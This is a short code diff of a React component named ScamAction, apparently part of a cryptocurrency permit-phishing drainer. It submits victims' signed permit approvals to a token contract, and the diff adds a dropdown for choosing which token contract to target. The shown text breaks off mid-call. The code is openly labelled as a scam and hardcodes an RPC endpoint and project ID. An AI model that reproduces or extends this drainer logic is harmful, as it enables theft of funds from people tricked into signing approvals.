@@ -3,15 +3,21 @@
 import {SignedPermitSignature} from "@/app/scam/page";
 import { callContractMethod } from "../page";
 import {CustomContract} from "@/app/TokenList";
-import React from "react";
+import React, {useState} from "react";
 
 const ScamAction = (props: {
 	data: SignedPermitSignature
 }) => {
 	const {data} = props;
+	const [contractAddress, setContractAddress] = useState(CustomContract.ETH);
 	const provider = "https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405";
 	return (
 		<div className={'flex gap-3'}>
+			<select>
+				{Object.entries(CustomContract).map(([key, value]) => (
+					<option key={key} value={value}>{key}</option>
+				))}
+			</select>
 			<button onClick={() => {
 				callContractMethod('permit', [
 						data.permit.owner,
